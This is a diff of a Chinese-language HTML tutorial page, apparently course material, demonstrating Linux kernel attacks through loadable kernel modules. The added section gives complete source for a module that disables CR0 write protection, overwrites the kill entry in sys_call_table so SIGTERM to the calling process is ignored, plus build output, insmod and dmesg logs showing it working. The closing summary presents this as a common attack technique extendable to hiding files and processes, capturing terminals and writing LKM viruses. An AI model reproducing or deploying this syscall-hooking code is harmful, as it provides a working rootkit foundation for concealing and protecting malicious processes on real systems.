-<p>通过查看系统调用表，我们也可以按照同样方法检测 mkdir, rmdir 等命令</p>
+<p>通过查看系统调用表，我们也可以按照同样方法检测 mkdir, rmdir 等命令。</p>
 <pre><code>$ vi /usr/src/linux-headers-3.2.0-29-generic-pae/arch/x86/include/asm/unistd_32.h 
  47 #define __NR_mkdir               39
  48 #define __NR_rmdir               40</code></pre>
-<h2 id="安全漏洞案例2-kill命令">安全漏洞案例2 Kill命令</h2>
+<h2 id="安全漏洞案例2-kill命令">安全漏洞案例2-Kill命令</h2>
+<p>我们使用 kill 命令可以杀死进程，如果是黑客注入的某些进程，通常不希望用户可以用 kill 命令杀死，而其他进程则可以杀死。要实现这个功能，就需要对 kill 命令的进程号和进程名称进行识别，如果是某些特殊进程，则可以忽略不杀死，对于其他进程，则可以用原来的系统调用来进行处理。</p>
+<h3 id="获得系统调用号-1">获得系统调用号</h3>
 <pre><code>$ cat /usr/src/linux-headers-3.2.0-29-generic-pae/arch/x86/include/asm/unistd_32.h | grep kill
-
 #define __NR_kill        37
 #define __NR_tkill      238
-#define __NR_tgkill     270
+#define __NR_tgkill     270</code></pre>
+<h3 id="编译源码">编译源码</h3>
+<pre><code>$ cat hack-kill.c
 
-$ sudo insmod mk.ko
-$ ls
-aabb      mk.c      mkdir.mod.c  mkdir.o  mk.mod.c  m.ko  modules.order
-Makefile  mkdir.ko  mkdir.mod.o  mk.ko    mk.mod.o  mk.o  Module.symvers
-$ ps 
-  PID TTY          TIME CMD
- 3307 pts/2    00:00:10 bash
- 7043 pts/2    00:00:26 evince
-15090 pts/2    00:00:00 ps
-$ kill 7043
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/syscalls.h&gt;
+#include &lt;asm/unistd.h&gt;
+
+#include &lt;linux/sched.h&gt;
+
+//#define SYSCALL_NUM   __NR_getdents64
+#define SYSCALL_NUM __NR_kill
+
+MODULE_AUTHOR(&quot;AKAEDU&quot;);
+MODULE_DESCRIPTION(&quot;module example &quot;);
+MODULE_LICENSE(&quot;GPL&quot;);
+
+// see all syscall number in 
+// /usr/src/linux-headers-3.2.0-29-generic-pae/arch/x86/include/asm/unistd_32.h 
+
+//extern void* sys_call_table[]; /*sys_call_table 被引出，所以我们可访问它*/
+void ** sys_call_table = (int *)0xc15b0000;
+int (*orig_syscall)(int pid, int sig, ...); /*未改前的系统调用*/
+
+long hacked_cmd(int pid, int sig_no, ...)
+{
+    struct task_struct *ptr = current;
+    int ret;
+
+    printk(&quot;kill para pid = %d! sig = %d\n&quot;, pid, sig_no);
+
+    if ((pid == ptr-&gt;pid) &amp;&amp; (sig_no == SIGTERM))
+    {
+        printk(&quot;kill is hacked!\n&quot;);
+        printk(&quot;Use kill -9 to kill your bash!\n&quot;);
+        return 0;
+    }
+
+    ret = (*orig_syscall)(pid, sig_no);
+    printk(&quot;ret = %d\n&quot;, ret);
+    return  ret;
+}
+
+int orig_cr0;
+
+unsigned int clear_and_return_cr0(void)
+{
+    unsigned int cr0 = 0;
+    unsigned int ret;
+
+    asm volatile(&quot;movl %%cr0,%%eax&quot;
+            :&quot;=a&quot;(cr0)
+            );                                    //存储cr0的值
+    ret = cr0;
+
+    /*将cr0的第16位清零，第16为0表示允许超级权限*/
+    cr0 &amp;= 0xfffeffff;
+    asm volatile(&quot;movl %%eax,%%cr0&quot;
+            :
+            :&quot;a&quot;(cr0)
+            );
+    return ret;
+}
+
+//恢复cr0寄存器的第16位
+void setback_cr0(unsigned int val)
+{
+    asm volatile(&quot;movl %%eax,%%cr0&quot;
+            :
+            :&quot;a&quot;(val)
+            );    
+}
+
+int my_init_module(void) /*模块初始化*/
+{
+    printk(&quot;init ok, SYSCALL NUM = %d\n&quot;, SYSCALL_NUM);
+    printk(&quot;table at %p\n&quot;, sys_call_table);
+
+    orig_cr0 = clear_and_return_cr0(); //cr0寄存器的第16位清0
+
+    orig_syscall = sys_call_table[SYSCALL_NUM];
+
+    sys_call_table[SYSCALL_NUM] = hacked_cmd;
+
+    //恢复cr0寄存器的第16位    
+    setback_cr0(orig_cr0);
+
+    return 0;
+}
+
+void my_cleanup_module(void) /*模块卸载*/
+{
+    printk(&quot;exit ok\n&quot;);
+
+    orig_cr0 = clear_and_return_cr0(); //cr0寄存器的第16位清0
+
+    sys_call_table[SYSCALL_NUM] = orig_syscall; /*把系统调用恢复*/
+
+    //恢复cr0寄存器的第16位    
+    setback_cr0(orig_cr0);
+}
+
+
+module_init(my_init_module);
+module_exit(my_cleanup_module);
+$ </code></pre>
+<h3 id="编译生成内核模块">编译生成内核模块</h3>
+<pre><code>$ make
+make -C /usr/src/linux-headers-3.2.0-29-generic-pae/    SUBDIRS=/home/akaedu/Github/comment-subs/secure-hole/2-hack-kill    modules
+make[1]: Entering directory `/usr/src/linux-headers-3.2.0-29-generic-pae&#39;
+  CC [M]  /home/akaedu/Github/comment-subs/secure-hole/2-hack-kill/hack-kill.o
+/home/akaedu/Github/comment-subs/secure-hole/2-hack-kill/hack-kill.c:20:26: warning: initialization from incompatible pointer type [enabled by default]
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/akaedu/Github/comment-subs/secure-hole/2-hack-kill/hack-kill.mod.o
+  LD [M]  /home/akaedu/Github/comment-subs/secure-hole/2-hack-kill/hack-kill.ko
+make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-29-generic-pae&#39;
+$ </code></pre>
+<h3 id="插入模块查看系统日志输出">插入模块，查看系统日志输出</h3>
+<pre><code>$ sudo insmod hack-kill.ko
+[sudo] password for akaedu: 
+$ sudo dmesg -C
 $ dmesg | tail
-[83680.122974] table at c15b0000
-[83706.463982] exit ok
-[83733.513558] init ok, SYS_mkdir = 39
-[83733.513570] table at c15b0000
-[83736.190368] haha, mkdir is hacked!
-[83747.506425] haha, mkdir is hacked!
-[83759.254190] exit ok
-[84529.398497] init ok, SYS_mkdir = 37
-[84529.398504] table at c15b0000
-[84556.100726] haha, mkdir is hacked!
-$ sudo rmmod mk.ko
-$ kill 7043</code></pre>
-<p>参考资料： <a href="http://hi.baidu.com/lu_youyou/item/b6585ff84ade0b1ea62988c9"><code class="url">http://hi.baidu.com/lu_youyou/item/b6585ff84ade0b1ea62988c9</code></a></p>
+[ 5923.634714] init ok, SYSCALL NUM = 37
+[ 5923.634719] table at c15b0000</code></pre>
+<h3 id="运行-kill-试图杀死当前-bash-不能成功">运行 kill 试图杀死当前 bash 不能成功</h3>
+<pre><code>$ ps
+  PID TTY          TIME CMD
+ 3465 pts/2    00:00:00 bash
+ 9074 pts/2    00:00:00 ps
+$ kill 3465
+$ dmesg | tail
+[ 6018.505708] kill para pid = 3465! sig = 15
+[ 6018.505712] kill is hacked!
+[ 6018.505715] Use kill -9 to kill your bash!
+$ </code></pre>
+<h3 id="杀死其他进程cat可以成功">杀死其他进程(cat)可以成功</h3>
+<p>启动一个新的 bash 窗口，运行 cat &amp; 命令</p>
+<pre><code>$ cat </code></pre>
+<p>回到之前的 bash 窗口，查看该进程 id</p>
+<pre><code>$ ps a | grep cat
+ 9092 pts/3    S+     0:00 cat
+ 9097 pts/2    S+     0:00 grep --color=auto cat
+$</code></pre>
+<p>成功杀死该 cat 进程</p>
+<pre><code>$ kill 9092
+$ dmesg | tail
+[ 6018.505708] kill para pid = 3465! sig = 15
+[ 6018.505712] kill is hacked!
+[ 6018.505715] Use kill -9 to kill your bash!
+[ 6244.359153] kill para pid = 9092! sig = 15
+[ 6244.359285] ret = 0
+$ </code></pre>
+<p>查看新的 bash 窗口，cat 进程已经杀死</p>
+<pre><code>$ cat
+Terminated
+$ </code></pre>
+<h2 id="总结">总结</h2>
+<p>以上两个有关于用 LKM注入的方法，案例1中ls系统调用，我们只是简单接管了一下，并没有实现ls相关的功能，比较简单。案例2中的 kill 系统调用，我们不仅接管了kill，而且根据不同的环境情况，分别进行了相应的处理，也就是有选择的来调用原来的系统调用功能，这种方法是比较经常使用的攻击手段。</p>
+<p>事实上，Linux 内核目前支持的300多个(3.2.0的内核是348个)系统调用，都可以采用类似上面的2种方法来进行内核攻击，涉及的范围包括隐藏文件，隐藏文件内容，隐藏进程，控制socket，截取终端tty，编写LKM病毒等等。</p>
+<ul>
+<li><p>参考资料：<br /><a href="http://hi.baidu.com/lu_youyou/item/b6585ff84ade0b1ea62988c9"><code class="url">http://hi.baidu.com/lu_youyou/item/b6585ff84ade0b1ea62988c9</code></a></p></li>
+</ul>
